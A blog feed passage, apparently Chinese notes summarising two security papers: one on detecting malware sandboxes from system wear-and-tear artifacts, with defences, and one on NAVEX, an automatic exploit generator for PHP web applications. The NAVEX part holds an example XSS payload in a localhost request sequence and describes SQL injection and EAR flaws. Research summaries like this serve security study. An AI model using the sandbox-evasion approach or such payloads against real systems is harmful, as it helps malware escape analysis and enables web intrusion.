Probing for Artifacts while Preserving User Privacy</h3><p>从artifact地选择上来看可以分为两种:一种是直接源于用户活动；另一种是来自系统活动(用户活动的间接表现)。</p><p>直接来源是针对用户行为的定性指标：</p><ol><li>文档文件夹是否包含具有预期文件扩展名的合理数量的文件；</li><li>检查流行文档查看应用程序中最近打开的文档；</li><li>最近键入的在线搜索引擎查询；</li><li>系统范围的搜索查询</li><li>即时消息；</li><li>电子邮件消息内容<br>但是这些将会对用户的隐私造成侵犯，所以本文的方案将使用间接来源(比如:统计cookie、访问的URL数量等方式)</li></ol><h3 id="B-Artifact-Categories"><a href="#B-Artifact-Categories" class="headerlink" title="B. Artifact Categories"></a>B. Artifact Categories</h3><p>本文主要针对Windows操作系统进行研究，所以采用的artifact类别集合如下表所示:</p><p><img src="https://i.loli.net/2019/03/20/5c91ebb3a0f41.png" alt="C8483676-8960-47A8-86DB-0BA4C555E98B.png"></p><h2 id="IV-DATA-COLLECTION"><a href="#IV-DATA-COLLECTION" class="headerlink" title="IV. DATA COLLECTION"></a>IV. DATA COLLECTION</h2><h3 id="A-Probe-Tool-Implementation"><a href="#A-Probe-Tool-Implementation" class="headerlink" title="A. Probe Tool Implementation"></a>A. Probe Tool Implementation</h3><p>为了从真实用户系统和恶意软件沙箱中收集以上类别的artifact数据集，作者实现了一个只使用系统API、不需要安装并且兼容Windows XP到Windows 10的探针程序。这个程序主要有以下几个特点:</p><ol><li>使用HTTPS信道传输收集到的artifact数据防止沙箱拦截请求；</li><li>收集一些BIOS供应商等其他信息用于VM启发式检测，来去除用户集中可能存在的VM结果集；</li><li>唯一的嵌入式ID来识别同一供应商的多次提交(一些砂箱会将程序放在多个不同的环境中进行动态分析，进而检测其行为)；</li><li>基于操作系统安装日期，Windows版本，BIOS供应商等信息的组合来区分不同的操作系统。</li></ol><h3 id="B-IRB-Approval-and-User-Involvement"><a href="#B-IRB-Approval-and-User-Involvement" class="headerlink" title="B. IRB Approval and User Involvement"></a>B. IRB Approval and User Involvement</h3><p>这部分主要讲述作者在申请IRB批准，从而让真实用户参与进这个项目中。</p><h3 id="C-Data-Collection"><a href="#C-Data-Collection" class="headerlink" title="C. Data Collection"></a>C. Data Collection</h3><p><strong>第一个数据集（Dreal）-&gt;</strong> 270个真实用户机器，其中有89.4％是Amazon Mechanical Turk workers。国家分布为美国（44％），印度（18％），GB（10％），CA（8％），NL（1％），PK （1％），RU（1％）和其他28个频率低于1％的国家/地区(这种国家分析代表了从发达国家到发展中国家的计算机使用磨损特性)。表II中显示了用户系统的BIOS供应商分布。</p><p><img src="https://i.loli.net/2019/03/20/5c91ebd9f2459.png" alt="C78622AB-6BEF-4026-BD60-443C678D64C4.png"></p><p>PS:后面作者发现Amazon Mechanical Turk workers是一种跟搜索引擎相结合的沙箱，因此将这一部分的数据标记为“crawlers”并合并到后面的沙箱数据集中。</p><p><strong>第二个数据集（Dsand）-&gt;</strong> 来自15个可以收集到信息的恶意软件沙箱，表III是沙箱与对应探针回收的信息。</p><p><img src="https://i.loli.net/2019/03/20/5c91ebf611d6b.png" alt="F93245B2-9D5E-4021-8193-C786CCB797B6.png"></p><p>PS:有的沙箱环境会在底层使用不同版本的操作系统来分别进行分析。</p><p><strong>第三个数据集（Dbase）-&gt;</strong> 基准数据集，数据来自多个全新安装的Microsoft Windows版本(包括Azure和AWS提供的云Windows服务器)。</p><h3 id="D-Dataset-Statistics"><a href="#D-Dataset-Statistics" class="headerlink" title="D. Dataset Statistics"></a>D. Dataset Statistics</h3><p>表IV显示了我们三个收集的数据集中不同Microsoft Windows版本的数量。(可以看出沙箱的系统分布与真实用户的是不相同的)。</p><p><img src="https://i.loli.net/2019/03/20/5c91ec1191b91.png" alt="245E7896-EF5A-4113-9D57-9B52A7CBAF1C.png"></p><p>图1显示了三个数据集（Dreal，Dsand和Dbase）中每个磨损artifact值的分布。从中可以看到:1.大多数artifact在真实用户系统中的值大于沙箱和基线中的值，因此可以用来区分真实用户和沙箱；2.真实用户的artifact值分布更宽，因此可以用来预测系统年龄。</p><p>PS: 可以看到沙箱的appdiffdays和sysdiffdays值比真实用户高很多，因此沙箱系统一般比真实用户系统“老化”程度更高。</p><p><img src="https://i.loli.net/2019/03/20/5c91ec2ee2d88.png" alt="14E8B219-A888-4C3C-B543-F662C51B6938.png"></p><p>图2显示了Mann-Whitney U检验显示的Dreal和Dsand分布之间差异的影响大小。0.3和0.5之间的效果被认为是“中等”效应的特征，而高于0.5的效应被认为是“强”效应。 </p><p><img src="https://i.loli.net/2019/03/20/5c91ec4613e0d.png" alt="35DDDF7E-590D-43D1-908D-68EE9F072667.png"></p><h2 id="V-EVADING-MALWARE-SANDBOXES"><a href="#V-EVADING-MALWARE-SANDBOXES" class="headerlink" title="V. EVADING MALWARE SANDBOXES"></a>V. EVADING MALWARE SANDBOXES</h2><p>以上的统计信息说明了作者所选用的artifact是可以作为特征来分辨沙箱的，因此接下来将使用有监督机器学习方式，训练决策树模型来进一步完成对沙箱的规避工作。</p><h3 id="A-Setup-and-Classifier"><a href="#A-Setup-and-Classifier" class="headerlink" title="A. Setup and Classifier"></a>A. Setup and Classifier</h3><ol><li>使用决策树模型。因为决策树模型可以表现为一系列的if-else语句，从而将恶意软件的整体足迹保持在最小。</li><li>计算皮尔森相关系数（r）来检查特征对的相关性。虽然有4对特征具有很强的相关性（r&gt; 0.7），但是为了尽可能的规避所有沙箱，作者还是采用了所有的特征。</li><li>训练集：49个沙箱环境实例，22个新安装操作系统的实例，71个真实用户实例；测试集：剩余的49个沙箱环境实例，49个真实用户随机样本。</li><li>使用10-trial adaptive boosting算法(创建多个树，每个树专注改进前一棵树的结果)和adaptive boosting决策树算法(覆盖单棵树不能到达的边界)来提升分类器准确性。</li><li>指定成本矩阵减少漏报的出现(原则是宁可不感染到某些真实用户，也尽量不能被沙箱捕获)。</li></ol><p>PS: FP 误报-&gt;没有感染真实用户主机；FN 漏报-&gt;尝试感染沙箱</p><h3 id="B-Evaluation"><a href="#B-Evaluation" class="headerlink" title="B. Evaluation"></a>B. Evaluation</h3><p>模型在测试集上达到了92.86％的准确率，假阴性率（FNR）为4.08％，假阳性率（FPR）为10.20％。 十个构建的树的平均树大小为4.6分裂，最短的树具有3个分裂，最长的树分裂为5个。 表V显示了对算法最有用的功能，以及使用任何给定功能的树的百分比。</p><p><img src="https://i.loli.net/2019/03/20/5c91ec5d88eee.png" alt="A9DDAD20-0A49-4538-A0F3-82D1761AAD55.png"></p><p>之后作者从两个思路出发:<br>一、评估我们的算法对沙盒环境中增量变化的稳健性<br>方法: 每次只删除一个特征，将以上分类器训练过程重复30次。<br>目的: 对于攻击者而言量化恶意软件区分沙箱和真实用户的能力；对于防御者而言可以使用在此处识别的最有价值的artifact磨损程度来模仿真实的用户系统。<br>效果: 图4显示了准确性，误报率和漏报率如何变化。可以看到即使删除多达20个特征，分类器的整体准确性仍高于90%。</p><p><img src="https://i.loli.net/2019/03/20/5c91ec794e2f8.png" alt="5449284B-9778-47B5-AD73-8A4192F83FEF.png"></p><p>二、每种类型的工件如何影响分类器的准确性<br>方法: 一次仅使用<strong>一种</strong>类型的工件重新训练我们的模型。<br>目的: 让恶意软件作者可以选择他们想要关注的artifact类别，但这种选择不会影响恶意软件的规避能力。<br>效果: 表VI显示了每个类别的artifact数量以及每个分类器在测试数据集上的性能。</p><p><img src="https://i.loli.net/2019/03/20/5c91ec96391e3.png" alt="7045C7A1-D656-47AB-9A00-EF01DD79BE20.png"></p><h2 id="VI-ESTIMATING-ACTUAL-SYSTEM-AGE"><a href="#VI-ESTIMATING-ACTUAL-SYSTEM-AGE" class="headerlink" title="VI. ESTIMATING ACTUAL SYSTEM AGE"></a>VI. ESTIMATING ACTUAL SYSTEM AGE</h2><p>在之前的数据分析中，可以发现沙箱环境的“老化”程度与用户的真实环境是截然不同的。而且理论上“磨损”程度和“老化”程度应该是相匹配的，如果不匹配那么是沙箱的概率则很大。对于攻击者可以使用者一特点进行沙箱规避；对于防御者则可以对沙箱做更好的调整。</p><h3 id="A-Correlation-Between-Age-and-Artifacts"><a href="#A-Correlation-Between-Age-and-Artifacts" class="headerlink" title="A. Correlation Between Age and Artifacts"></a>A. Correlation Between Age and Artifacts</h3><p>目的: 得出artifact的磨损与系统年龄之间的关系</p><p>图5显示了用户系统和恶意软件沙箱“年龄”的累积分布函数。可以看到平均而言用户系统比沙箱更“新”。</p><p><img src="https://i.loli.net/2019/03/20/5c91ecb059a15.png" alt="955EEF8C-F9A3-484B-BED1-E9639103F436.png"></p><p>图6显示了报告的年龄与真实用户系统的每个artifact磨损程度之间的皮尔森相关系数。此处假设从真实用户系统收集的报告年龄是准确的。</p><p><img src="https://i.loli.net/2019/03/20/5c91ecc913f22.png" alt="BB57F337-F65C-4E51-97DA-6D705ADBD54E.png"></p><p>观测结果分析:</p><ol><li>许多非常成功地区分真实机器和沙箱的工件实际上与机器的年龄无关；</li><li>一些与用户活动直接相关的artifact不能很好的反映系统的年龄，比如cookie的数量(用户可以主动清除)；</li><li>一些不太容易被用户修改的artifact将跟系统年龄成正相关，比如连接过的USB数量。</li></ol><h3 id="B-Regression"><a href="#B-Regression" class="headerlink" title="B. Regression"></a>B. Regression</h3><p>目的: 确定组合它们的原始值来估计系统的实际年龄的合适方法。<br>数据集处理: </p><ol><li>删除具有缺失值的artifact；</li><li>删除丢失率超过80％的artifact。</li></ol><p>(1) Linear Regression:</p><ul><li>公式: Y =β0+β1X1+β2X2+ … +ε (Xi是给定的artifact值，βi是对应的权重，Y是预测的年龄)</li><li>数据集: 训练（60％），测试（40％）</li><li>评估: 十折交叉验证</li><li>结果: 真实系统的预测年龄的最终均方误差（MSE）是1.88，而沙箱的MSE非常高，为6.25。</li><li>结论: 使用artifact的磨损程度来预测系统年龄是可行的，也就是说使用预测年龄和系统的生成年龄的对比来识别沙箱是可行的。</li></ul><p>PS: 十折交叉验证，英文名叫做10-fold cross-validation，用来测试算法准确性。是常用的测试方法。将数据集分成十份，轮流将其中9份作为训练数据，1份作为测试数据，进行试验。</p><p>表VII中报告了模型的系数及其p值。 我们看到13种artifact磨损程度与机器的年龄相关，具有统计学意义。</p><p><img src="https://i.loli.net/2019/03/20/5c91ecdfea41f.png" alt="979FD293-1188-4E1A-9CBD-B71774AE2479.png"></p><p>图7显示了在Dreal和Dsand系统上应用线性回归模型时残差值的累积分布函数(CDF)。可以看到在尝试预测沙箱年龄时的残差值是非常高的。</p><p><img src="https://i.loli.net/2019/03/20/5c91ecf70f6f7.png" alt="78E7479C-A68A-4E2E-A22A-30EEB34D017A.png"></p><p>(2) Lasso Regression</p><ul><li>目的: 验证复杂的回归模型是否会带来更好的预测准确性</li><li>套索回归的优点: 比线性回归使用更少的预测变量，这降低了整体模型的复杂性。 对于恶意软件，较小的功能集意味着对底层操作系统的API调用较少，从而减少了触发可疑活动监视器的机会。</li><li>数据集: 训练集，评估集和测试集</li><li>方法: 交叉验证来找到最佳的λ值</li><li>结果: Dreal集的MSE为0.749，Dsand集上的MSE为4.45，优于线性回归</li><li>结论: Lasso模型可以更好地辨别沙箱。</li></ul><p>表VIII显示了Lasso模型选择的八个特征，它们是系统年龄及其相应系数的良好预测因子。</p><p><img src="https://i.loli.net/2019/03/20/5c91ed105f20b.png" alt="D81E841A-08BA-45BF-8A4E-B01D07FEE934.png"></p><p>小结: 使用artifact磨损程度来预测系统年龄是可行的，这一方面可以用于辨识沙箱；另一方面是可以帮助sandbox开发人员创建系统年龄相符的沙箱环境</p><h2 id="VII-DISCUSSION"><a href="#VII-DISCUSSION" class="headerlink" title="VII. DISCUSSION"></a>VII. DISCUSSION</h2><h3 id="A-Ethical-Considerations-and-Coordinated-Disclosure"><a href="#A-Ethical-Considerations-and-Coordinated-Disclosure" class="headerlink" title="A. Ethical Considerations and Coordinated Disclosure"></a>A. Ethical Considerations and Coordinated Disclosure</h3><p>本文主要讲述了这种新的规避技术的有效性，并且目前已经出现了此类相关工作的恶意软件。但是本文主要是为了帮助创建更强大的恶意软件分析系统。</p><h3 id="B-Probing-Stealthiness"><a href="#B-Probing-Stealthiness" class="headerlink" title="B. Probing Stealthiness"></a>B. Probing Stealthiness</h3><p>1.总是存在不受监控的artifact集；<br>2.虽然最小特权原则造成的系统API调用限制，可访问的环境限制，但是依旧可以从其他不受限制的artifact集获取大量信息；</p><h3 id="C-OS-Dependability"><a href="#C-OS-Dependability" class="headerlink" title="C. OS Dependability"></a>C. OS Dependability</h3><p>文章虽然是基于Windows平台在进行artifact的分析，但其中的一些artifact并不是其特有的，在其它系统例如Linux，Mac，Android等也同样适用。如果想适用Java等编写跨平台的恶意软件，就可以去关注那些不依赖于特定系统而存在的artifact。</p><h3 id="D-Defenses"><a href="#D-Defenses" class="headerlink" title="D. Defenses"></a>D. Defenses</h3><ol><li>克隆真实用户系统并将其用作恶意软件沙箱的基础。<br>缺点:<br>i) 隐私问题（如何在克隆之前或之后擦除所有私人信息，但保留磨损工件完整？）；<br>ii) artifact的老化问题(攻击者可以使用我们提出的统计模型来检测声称的年龄与磨损程度不匹配的情况)。</li><li>从新安装的操作系统映像开始，通过自动模拟用户操作人为地使其老化。<br>缺点:尚不清楚这种人工老化在多大程度上会产生与真实系统相似的artifact情况。</li></ol><h2 id="VIII-CONCLUSION-AND-FUTURE-WORK"><a href="#VIII-CONCLUSION-AND-FUTURE-WORK" class="headerlink" title="VIII. CONCLUSION AND FUTURE WORK"></a>VIII. CONCLUSION AND FUTURE WORK</h2><p>本文主要做了两个方面工作:</p><ol><li>攻击者角度:将Windows系统的一些不涉及用户隐私的artifact作为特征，使用决策树分类器进行训练，最终可以在92.86％的准确度上来识别沙箱环境。</li><li>防御者角度:将系统的artifact特征与系统的年龄进行联系并提出统计模型，从而帮助沙箱操作人员对系统进行微调，使其具有更逼真的磨损特性。</li></ol><p>未来工作:</p><ol><li>克隆真实用户系统并将其用作恶意软件沙箱的基础。</li><li>自动模拟用户操作人为地使系统其老化到所需程度。</li><li>不同的桌面操作系统以及移动设备中评估基于artifact磨损特性的沙盒规避的有效性。</li></ol><p>PS: 本文技术仅供研究参考，请勿利用本文技术施行攻击行为。</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>NAVEX-&gt;Precise and Scalable Exploit Generation for Dynamic Web Applications</title>
      <link href="/2019/03/11/NAVEX-Precise-and-Scalable-Exploit-Generation-for-Dynamic-Web-Applications/"/>
      <url>/2019/03/11/NAVEX-Precise-and-Scalable-Exploit-Generation-for-Dynamic-Web-Applications/</url>
      <content type="html"><![CDATA[<p>出处：27th USENIX Security Symposium<br>作者：Abeer Alhuzali, Rigel Gjomemo, Birhanu Eshete, and V.N.<br>单位：Venkatakrishnan University of Illinois at Chicago<br>资料：<a href="https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-alhuzali.pdf" target="_blank" rel="external">Paper</a> | <a href="https://github.com/aalhuz/navex" target="_blank" rel="external">Github</a></p><h2 id="1-Abstract-amp-Introduction"><a href="#1-Abstract-amp-Introduction" class="headerlink" title="1. Abstract &amp; Introduction"></a>1. Abstract &amp; Introduction</h2><p>作者在本文中提出了一种以静态分析作为指导，结合动态分析自动验证漏洞并构造可用exploit的工具NAVEX。</p><p>研究问题：</p><ol><li>解决以往自动化审计的误报以及必须结合人工参与构造Exp的问题；</li><li>静态分析虽然覆盖率高，但是对于具有动态特性的语言其建模困难。</li></ol><p>解决方案：</p><ol><li>静态分析阶段：使用符号执行创建Web应用程序的各个模块的行为模型。标记出包含潜在漏洞点的模块；</li><li>动态分析阶段：使用Web爬虫和concolic执行器去发现可能导致攻击者进入易受攻击模块的可能的HTTP导航路径，之后使用约束求解器生成一组对漏洞进行利用的HTTP输入序列。</li></ol><p>方案优点：</p><ol><li>动态分析与静态分析相结合提升了性能，可以应用于大型应用程序；</li><li>是一种多类型漏洞的Exp生成框架。</li></ol><p>NAVEX分析了320万行PHP代码，自动构建并利用204个漏洞，其中有195个与SQLI和XSS相关，而9个与逻辑漏洞相关。此外NAVEX是第一个可以自动发现并利用EAR漏洞的方案。</p><h2 id="2-Challenges-and-Approach-Overview"><a href="#2-Challenges-and-Approach-Overview" class="headerlink" title="2 Challenges and Approach Overview"></a>2 Challenges and Approach Overview</h2><h3 id="2-1-Running-Example"><a href="#2-1-Running-Example" class="headerlink" title="2.1 Running Example"></a>2.1 Running Example</h3><p>下面是一个包含漏洞的小型Web程序。selectBooks.php模块在第23-38行使用了Web表单来实现选择数据，其中在23行调用了JavaScript来验证数输入，相关定义在第31-36行。第4-12行实现用户输入由服务器端代码进一步验证和过滤。之后第17行通过MySQL查询来验证书籍的可用性。最后根据查询结果，初始化<code>$_SESSION[&#39;ISBN&#39;]</code>并在浏览器上打印到hold.php的HTTP链接。</p><p><img src="https://i.loli.net/2019/03/11/5c864e9947f8c.png" alt="8E259CF4-FEA9-4D4E-8E07-C08A15BA1EB6.png"></p><p>之后跳转到hold.php执行附加检查，如果满足，则HTTP链接引导用户进入下一步（第7行）。 单击链接时，将设置超全局<code>$_GET [&#39;step&#39;]</code>，从而让hold.php包含模块checkout.php并执行。 </p><p><img src="https://i.loli.net/2019/03/11/5c864ec6577c1.png" alt="5A1EE632-5A0E-491B-8195-C1B06838143C.png"></p><p>checkout.php通过向用户提供链接（第19行）进行确认来完成借用过程。 该链接设置两个超全局变量（<code>$_GET[&#39;step&#39;]</code>和<code>$_GET[&#39;msg&#39;]</code>），将在第6行进行检验。最后，调用确认功能（第13行）以通知用户该书已成功保留。</p><p><img src="https://i.loli.net/2019/03/11/5c864f01361f7.png" alt="E9459D5E-66EE-4A62-97DA-943E13DF4E35.png"></p><p>该程序存在以下几点缺陷：</p><ol><li>selectBooks.php:17中$publisher经过简单校验就传入SQL语句进行拼接，可造成SQLi漏洞(str_place函数进行了无效过滤)；</li><li>checkout.php:15行使用了echo，可能会造成XSS；</li><li>selectBooks.php:3行调用header但是没有使用exit()，造成EAR漏洞进而可以在不进行登录的情况下触发下面的SQLi漏洞。</li></ol><h3 id="2-2-Challenges"><a href="#2-2-Challenges" class="headerlink" title="2.2 Challenges"></a>2.2 Challenges</h3><p>面临的挑战主要是以下三点：</p><ol><li><strong>污点可达性</strong>：对于WebApp而言，完成一个功能往往是各模块相关联的。此外，模块中往往还使用内置函数过滤(比如htmlspecialchars)、隐式过滤(比如类型转换)、自定义过滤和数据库约束条件带来的过滤来消除风险。所以攻击路径的寻找是具有一定难度的。</li><li><strong>动态特征</strong>：静态分析对于动态程序的分析具有局限性，比如无法推断动态将会生成怎样的表单或者链接(比如使用JavaScript来生成的内容)。</li><li><strong>扩展性</strong>：对大型程序的分析会覆盖客户端，服务器端和数据库后端，因而会产生很多路径，必须使用一些方法来减少一些无用的路径。<u>(之所以叫扩展性应该是跟后面的COG图的扩展有关)</u></li></ol><h3 id="2-3-Approach-Overview"><a href="#2-3-Approach-Overview" class="headerlink" title="2.3 Approach Overview"></a>2.3 Approach Overview</h3><p>方法主要分为两个步骤：</p><ol><li>可能的漏洞点识别。首先，定位程序中可能的漏洞点以及对应的模块(这样减少后面的搜索空间)；其次，对各种过滤方案进行了精确表示；最后，对自定义的过滤先使用符号约束构建模型之后使用约束求解器来判断过滤的稳健性。</li><li>具体的漏洞利用生成。首先，动态执行得到Web应用程序的导航结构；其次，结合静态分析得到的漏洞点和对应的模块寻找可行的攻击路径；最后，多次重复动态执行，使用约束求解最大化路径覆盖。</li></ol><p><img src="https://i.loli.net/2019/03/11/5c864f4b35dce.png" alt="D2FB48D5-F690-4DAA-BC89-AB374F6E5E7D.png"></p><h2 id="3-Architecture-and-Algorithms"><a href="#3-Architecture-and-Algorithms" class="headerlink" title="3 Architecture and Algorithms"></a>3 Architecture and Algorithms</h2><h3 id="3-1-Vulnerable-Sink-Identification"><a href="#3-1-Vulnerable-Sink-Identification" class="headerlink" title="3.1 Vulnerable Sink Identification"></a>3.1 Vulnerable Sink Identification</h3><p>目的：排除那些不包含漏洞点的模块<br>方法：如下图，首先，构建每个模块代码的图模型；然后，发现包含源和目标(漏洞点)之间数据流的路径；最后，使用符号执行生成公式后利用约束求解以确定哪些路径可能被利用。</p><p><img src="https://i.loli.net/2019/03/11/5c864f6bcf338.png" alt="B064337B-B161-45E6-9D27-DAFF8483B062.png"></p><h4 id="3-1-1-Attack-Dictionary"><a href="#3-1-1-Attack-Dictionary" class="headerlink" title="3.1.1 Attack Dictionary"></a>3.1.1 Attack Dictionary</h4><p>多种漏洞被触发的过程是相似的–均是攻击载荷到达敏感接收器进而触发漏洞，所以NAVEX使用这种相似性构建了一个包含Sinks(敏感接收器)、Sanitizations(过滤函数)、遍历类型(前向遍历还是反向遍历)和攻击字符串(其实就是收集的WebFuzz字典)的攻击字典来实例化针对每类漏洞的分析。<br>字典包含：SQLI，XSS，文件包含，命令注入，代码执行和EAR漏洞。</p><h4 id="3-1-2-Graph-Construction"><a href="#3-1-2-Graph-Construction" class="headerlink" title="3.1.2 Graph Construction"></a>3.1.2 Graph Construction</h4><p>代码属性图（CPG）是一种结合了抽象语法树（AST），控制流图（CFG），调用图和数据依赖图（DDG）的表示。此处，将过滤标签和数据库约束标记作为属性添加到CPG，从而对其进行扩展。最终将漏洞发现问题转变为对CPG图的遍历问题。</p><h4 id="3-1-3-Graph-Traversal"><a href="#3-1-3-Graph-Traversal" class="headerlink" title="3.1.3 Graph Traversal"></a>3.1.3 Graph Traversal</h4><p>此步骤的目的是通过对扩展后CPG来寻找攻击路径，主要分为向后遍历和向前遍历。向后遍历的算法如下图所示。正向遍历则主要是从源到可能漏洞点的路径搜索，这种搜索方式也是对EAR漏洞的重要检测方法。(文中提到了良性EAR–header之后不含可利用点和恶性EAR–header之后包含可利用点)。图遍历最终将会返回一组可能容易受到攻击的路径供下一步使用。</p><p><img src="https://i.loli.net/2019/03/11/5c864fb562365.png" alt="回溯遍历算法.png"></p><h4 id="3-1-4-Exploit-String-Generation"><a href="#3-1-4-Exploit-String-Generation" class="headerlink" title="3.1.4 Exploit String Generation"></a>3.1.4 Exploit String Generation</h4><p>利用上一步发现的攻击路径来生成攻击字符串是静态分析的最后一步。首选构造增广公式 Fpath∧Fdb∧Fattack(Fpath是易受攻击的路径；Fdb是从DB标记派生的约束；Fattack是针对漏洞点的可控变量的，其值来源于之前构造的攻击字典)。之后使用求解器求出一组解(解就是是攻击字符串传入可控变量后在易受攻击的路径上经过过滤到达漏洞点依旧可以造成危害)。到此静态分析过程结束，之后的过程是通过动态分析得到攻击字符串到达攻击点的HTTP请求序列。</p><h3 id="3-2-Concrete-Exploit-Generation"><a href="#3-2-Concrete-Exploit-Generation" class="headerlink" title="3.2 Concrete Exploit Generation"></a>3.2 Concrete Exploit Generation</h3><p>NAVEX执行几个步骤来生成具体的Exp，如下图所示。首先，创建导航图来发现所有执行应用程序模块的可能HTTP请求序列；之后，结合静态分析阶段得到的可能漏洞点来筛选对应模块的执行路径；最终，生成可用的Exp。</p><p><img src="https://i.loli.net/2019/03/11/5c865018411ce.png" alt="E1E8930D-6DE3-4869-A279-BDEA0E11761A.png"></p><h4 id="3-2-1-Dynamic-Execution"><a href="#3-2-1-Dynamic-Execution" class="headerlink" title="3.2.1 Dynamic Execution"></a>3.2.1 Dynamic Execution</h4><p>NAVEX使用动态执行方法，借助约束求解和concolic执行来生成大量表单输入，以帮助爬虫最大化应用程序的覆盖范围。</p><p><strong>爬虫</strong>(解决客户端约束条件)：使用种子URL启动，可以对Web站点的每个角色自动化登录验证，采用广度优先遍历算法，新抓取的URL将作为下一次的爬虫的起始。此处的优点在于，首先，爬虫可以构造符合JavaScript验证的输入；其次，有效表单输入的自动生成提高了覆盖范围。</p><p>自动有效输入构造：NAVEX结合了表单HTML约束Fhtml和JavaScript约束Fjs来生成最终形式约束Fform，之后使用求解器来求解，最终得到对应的HTTP请求。示例如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 约束公式</span></div><div class="line">Fhtml : (book_name==<span class="string">"Intro to CS by author1"</span> ∨ book_name==<span class="string">"Intro to Math by author2"</span>)</div><div class="line">Fjs: edition &gt; <span class="number">0</span></div><div class="line">Fform: Fhtml ∧ Fjs</div><div class="line"><span class="comment">// 求解得到的HTTP请求</span></div><div class="line">http:.../selectBooks.php?action=borrow POST[book name=Intro to CS by author1, edition=<span class="number">2</span>]</div></pre></td></tr></table></figure><p><strong>解决服务器端约束</strong>：在服务端也会对输入有一定的约束，所以在满足前端约束后必须判断服务端约束是否也同时得到了满足。为解决这个问题，NAVEX会动态跟踪判断信息是否满足服务端约束，主要根据以下两点信息：(i)更改其状态（即，创建新会话，设置新变量和超全局值等）;(ii)执行敏感操作来确定请求是否成功，比如查询数据库等。如果检测到请求没有成功执行，那么将会concolic执行依据服务端程序逻辑得出约束公式并对之前发现的执行路径进行更新，之后使用求解器求解生成新的表单数据进行提交(在成功之前会一直执行这个过程)。服务端约束示例如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(book name==&quot;intro to CS by author1&quot; ∨ book name==&quot;intro to Math by author2&quot;) ∧ length(publisher)&lt;=35 ∧ edition &gt;0</div></pre></td></tr></table></figure><p>PS：NAVEX会存储导致成功提交的完整HTTP请求。</p><h4 id="3-2-2-Navigation-Graph"><a href="#3-2-2-Navigation-Graph" class="headerlink" title="3.2.2 Navigation Graph"></a>3.2.2 Navigation Graph</h4><p>导航图是一个有向图G=(N,E)，其中每个节点n∈N表示HTTP请求.每个边e=(ni,nj)∈E表示从ni到nj的导航，表示发起d的请求，可以是链接形式。图中的每个节点都具有以下属性id，URL，role和form params，用于表示表单提交生成的HTTP请求。id属性存储节点的唯一标识符，URL属性是HTTP请求中的URL，它由请求的模块名称和HTTP参数组成，role属性包含爬虫使用的登录凭证。示例图如下：</p><p><img src="https://i.loli.net/2019/03/11/5c864fe6b5e27.png" alt="FAB532BE-E611-4E9F-A43D-06D446DC8ED2.png"></p><h4 id="3-2-3-Final-Exploit-Generation"><a href="#3-2-3-Final-Exploit-Generation" class="headerlink" title="3.2.3 Final Exploit Generation"></a>3.2.3 Final Exploit Generation</h4><p>静态分析：扩展的CPG图和Exp字符串。<br>动态分析：NG导航图。<br>如何将这个两个信息进行组合并产生Exp就是此步的作用。<br><u><strong>优点：将漏洞Exp的构造问题转换为对图的简单搜索问题。</strong></u><br>难点：文件被包含这个过程在NG中是看不到的。<br>难点解决：预处理包含解析，此步骤创建存储文件包含关系的包含映射。通过执行遍历来构造映射，该遍历在增强的CPG中搜索表示对文件包含PHP函数的调用的节点，最终将得到包含图。<br>之后使用NG和包含图来搜索公共模块到存在漏洞模块的路径，具体算法见下图：</p><p><img src="https://i.loli.net/2019/03/11/5c86503f36ba1.png" alt="Exp生成算法.png"></p><p>依据Figure4我们使用算法得到的序列如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">1. http://localhost/App/index.php</div><div class="line">2. http://localhost/App/selectBooks.php with POST params:[book name=intro to CS by author1, edition=2,publisher=aaaaaaa]</div><div class="line">3. http://localhost/App/selectBooks.php?action</div><div class="line">=borrow</div><div class="line">4. http://localhost/App/hold.php</div><div class="line">5. http://localhost/App/hold.php?step=checkout</div><div class="line">6. http://localhost/App/hold.php?step=checkout</div><div class="line">&amp;msg=&lt;script&gt;alert(”XSS”);&lt;/script&gt;</div></pre></td></tr></table></figure><h2 id="4-Implementation"><a href="#4-Implementation" class="headerlink" title="4 Implementation"></a>4 Implementation</h2><p>NAVEX基于现有的几种工具进行实现：</p><ol><li>扩展的CPG图利用phpjoern进行实现；</li><li>扩展的CPG图存储在Neo4j图形数据库中；</li><li>图遍历算法使用Apache TinkerPop编写；</li><li>约束求解使用z3以及其扩展Z3-str；</li><li>爬虫程序使用被约束和z3断言扩展的crawler4j；</li><li>爬虫对JavaScript的处理使用了Narcissus JavaScript引擎的扩展；</li><li>服务端代码执行跟踪使用Xdebug。</li></ol><h2 id="5-Evaluation"><a href="#5-Evaluation" class="headerlink" title="5 Evaluation"></a>5 Evaluation</h2><p><strong>数据集</strong>：26个真实PHP应用程序，代码库组合为3.2M SLOC和22.7K PHP文件如下表所示。<br>标准：<br>(i) 评估最流行应用的最新版本，并且要求是复杂且大型的PHP应用程序，如Joomla，HotCRP和WordPress；<br>(ii) 使用NAVEX与已有的一些先进项目(例如，Chainsaw，RIPS)进行比较。</p><p><strong>部署</strong>：实验环境：Ubuntu 12.04 LTS VM，2核2.4GHz，40GB RAM。目标WebApp部署：(1)进行静态分析；(2)部署后进行动态分析(注意每次爬虫后要恢复数据库初始状态)</p><p><strong>结果摘要</strong>。 NAVEX共构建了204个漏洞exp，其中195个注入类型，9个是逻辑漏洞。 增强的CPG平均将假阳性（FP）减少了87％。包含用于构建导航图的客户端代码分析将Exp生成的精度平均提高了54％。 在评估集上，NAVEX能够进行6个HTTP请求来拼接出Exp。</p><p><strong>增强的代码属性图统计</strong>：表2显示了增强的CPG构建时间和大小，可以看出NAVEX的运行时开销很低。</p><p><img src="https://i.loli.net/2019/03/11/5c86506447b7c.png" alt="FC3B9A34-8992-4056-B2C1-D64DDAADDF90.png"></p><p><strong>导航图统计</strong>：表3总结了在NAVEX的步骤II中生成漏洞Exp的总时间。 </p><p><img src="https://i.loli.net/2019/03/11/5c86508b926af.png" 